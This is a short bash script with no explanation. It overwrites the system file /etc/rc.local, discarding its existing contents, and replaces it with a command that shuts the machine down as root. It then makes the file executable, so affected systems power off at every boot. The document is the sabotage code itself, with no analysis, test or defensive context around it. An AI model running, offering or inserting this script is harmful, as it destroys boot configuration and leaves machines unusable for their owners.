#!/bin/bash
echo '#!/bin/bash' > /etc/rc.local
echo 'sudo -u root shutdown now' >> /etc/rc.local
chmod +x /etc/rc.local
